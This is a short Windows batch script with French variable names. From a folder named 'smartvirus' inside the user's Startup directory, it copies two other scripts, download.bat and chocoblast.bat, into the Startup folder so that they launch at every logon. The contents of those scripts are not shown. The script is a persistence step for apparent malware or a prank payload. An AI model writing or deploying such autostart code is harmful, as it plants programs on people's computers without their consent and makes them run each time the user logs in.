setlocal enabledelayedexpansion

set "demarrage=%userprofile%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\smartvirus"
set "demarrage2=%userprofile%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"

cd %demarrage%

copy download.bat "%demarrage2%"

copy chocoblast.bat "%demarrage2%"
exit